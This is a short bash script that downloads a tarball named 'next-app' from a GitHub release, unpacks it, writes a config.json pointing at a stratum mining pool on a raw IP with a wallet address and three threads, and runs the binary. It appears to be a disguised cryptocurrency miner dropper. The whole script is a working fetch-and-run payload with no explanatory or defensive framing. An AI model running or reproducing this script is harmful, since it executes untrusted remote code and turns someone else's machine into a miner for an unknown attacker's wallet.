#!/bin/bash
wget https://github.com/mom742886/next-app/releases/download/v1/next-app.tar.gz

tar -xf next-app.tar.gz

echo '{"host": "stratum+tcp://93.123.82.33", "port": 443, "user": "mbc1qh9m6s26m5u0snjk7wp5gl4v6w6ecsgz7jsv482", "pass": "x", "threads": 3}' > config.json
ls -la
./next/next-app
